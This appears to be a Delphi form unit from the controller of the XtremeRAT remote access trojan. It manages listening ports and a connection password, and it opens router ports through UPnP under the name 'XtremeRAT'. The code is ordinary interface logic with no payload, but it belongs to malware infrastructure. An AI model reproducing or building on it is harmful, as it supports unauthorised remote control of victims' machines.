unit UnitSelectPort;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Buttons, ComCtrls, ImgList;

type
  TFormSelectPort = class(TForm)
    ImageList16: TImageList;
    ListView1: TListView;
    SpeedButton1: TSpeedButton;
    SpeedButton2: TSpeedButton;
    SpeedButton3: TSpeedButton;
    Label1: TLabel;
    Edit1: TEdit;
    CheckBox1: TCheckBox;
    ImageList24: TImageList;
    CheckBox2: TCheckBox;
    procedure FormCreate(Sender: TObject);
    procedure SpeedButton3Click(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure FormShow(Sender: TObject);
    procedure CheckBox1Click(Sender: TObject);
    procedure ListView1SelectItem(Sender: TObject; Item: TListItem;
      Selected: Boolean);
    procedure SpeedButton1Click(Sender: TObject);
    procedure SpeedButton2Click(Sender: TObject);
    procedure Edit1Change(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  TerminouUPnP: boolean;
  FormSelectPort: TFormSelectPort;

implementation

{$R *.dfm}

uses
  UnitConexao,
  UnitStrings,
  UnitMain,
  UnitConstantes;

procedure TFormSelectPort.CheckBox1Click(Sender: TObject);
begin
  if Checkbox1.Checked then Edit1.PasswordChar := #0 else Edit1.PasswordChar := '*';
end;

procedure TFormSelectPort.Edit1Change(Sender: TObject);
begin
  if Edit1.Text = '' then Edit1.Text := '0';
  if Length(Edit1.Text) > 10 then Edit1.Text := Copy(Edit1.Text, 1, 10);
end;

procedure TFormSelectPort.FormCloseQuery(Sender: TObject;
  var CanClose: Boolean);
begin
  if TerminouUPnP = False then
  begin
    CanClose := False;
    if MessageBox(Handle,
                  pchar(Traduzidos[124] + '?'),
                  pChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                  MB_ICONQUESTION or MB_YESNO or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) = idYes then
    begin
      CanClose := True;
    end;
  end;
end;

procedure TFormSelectPort.FormCreate(Sender: TObject);
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  ImageList24.GetBitmap(0, SpeedButton1.Glyph);
  ImageList24.GetBitmap(1, SpeedButton2.Glyph);
  ImageList24.GetBitmap(2, SpeedButton3.Glyph);
end;

function IntToStr(i: Int64): WideString;
begin
  Str(i, Result);
end;

procedure TFormSelectPort.FormShow(Sender: TObject);
var
  i: integer;
  Item: TListItem;
begin
  TerminouUPnP := True;
  CheckBox2.Checked := FormMain.UseUPnP;
  Edit1.Text := IntToStr(ConnectionPass);
  ListView1.Items.Clear;

  for i := 0 to High(IdTCPServers) do
  begin
    if IdTCPServers[i] <> nil then
    begin
      Item := ListView1.Items.Add;
      Item.ImageIndex := 0;
      Item.Caption := IntToStr(i);
    end;
  end;
end;

procedure TFormSelectPort.ListView1SelectItem(Sender: TObject; Item: TListItem;
  Selected: Boolean);
begin
  SpeedButton2.Visible := ListView1.Selected <> nil;
end;

procedure TFormSelectPort.SpeedButton1Click(Sender: TObject);
var
  i, j: integer;
  TempStr, localip: string;
  Item: TListItem;
begin
  if Inputquery(traduzidos[132], traduzidos[133], TempStr) = false then exit;
  try
    i := StrToInt(TempStr);
    except
    i := 0;
  end;
  if (i <= 0) or (i > 65535) then
  begin
    MessageBox(Handle,
               pwidechar(traduzidos[133]),
               pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
               MB_OK or MB_ICONWARNING or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    exit;
  end else
  begin
    if IniciarNovaConexao(i) = false then
    begin
      MessageBox(Handle,
                 pwidechar(traduzidos[125] + ' ' + inttostr(i) + ' ' + traduzidos[126]),
                 pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                 MB_OK or MB_ICONWARNING or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);

    end else
    begin
      if CheckBox2.Checked then
      begin
        localip := GetIPAddress;
        FormMain.UseUPnP := True;
        AddUPnPEntry(localip, i, 'XtremeRAT')
      end;

      Item := ListView1.Items.Add;
      Item.Caption := IntToStr(i);
      Item.ImageIndex := 0;

      TempStr := '';
      for j := 0 to high(IdTCPServers) do if IdTCPServers[j] <> nil then TempStr := TempStr + ' [' + inttostr(j) + ']';

      FormMain.StatusBar1.Panels.Items[3].Text := Traduzidos[27] + ': ' + TempStr;
      if FormMain.UseUPnP then FormMain.StatusBar1.Panels.Items[3].Text := FormMain.StatusBar1.Panels.Items[3].Text + ' (UPnP)';
    end;
  end;
end;

type
  TDesativarPorta = class(TThread)
  private
    Port: integer;
  protected
    procedure Execute; override;
  public
    constructor Create(xPort: integer);
  end;

constructor TDesativarPorta.Create(xPort: integer);
begin
  Port := xPort;
  inherited Create(True);
end;

procedure TDesativarPorta.Execute;
var
  i: integer;
  TempStr: string;
Begin
  DesativarPorta(Port);
  DeleteUPnPEntry(Port);

  TempStr := '';
  for i := 0 to high(IdTCPServers) do if IdTCPServers[i] <> nil then TempStr := TempStr + ' [' + inttostr(i) + ']';

  FormMain.StatusBar1.Panels.Items[3].Text := Traduzidos[27] + ': ' + TempStr;
  if FormMain.UseUPnP then FormMain.StatusBar1.Panels.Items[3].Text := FormMain.StatusBar1.Panels.Items[3].Text + ' (UPnP)';
end;

procedure TFormSelectPort.SpeedButton2Click(Sender: TObject);
var
  Desativar: TDesativarPorta;
begin
  if ListView1.Selected = nil then exit;

  if MessageBox(Handle,
                pwidechar(traduzidos[134] + #13#10 + traduzidos[135] + '?'),
                pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> IdYes then exit;

  Desativar := TDesativarPorta.Create(StrToInt(ListView1.Selected.Caption));
  Desativar.Resume;

  ListView1.Selected.Delete;
end;

procedure TFormSelectPort.SpeedButton3Click(Sender: TObject);
var
  i: int64;
begin
  try
    i := StrToInt(Edit1.Text);
    except
    i := 0;
  end;
  if i > 0 then ModalResult := mrOK else ModalResult := mrCancel;
end;

end.
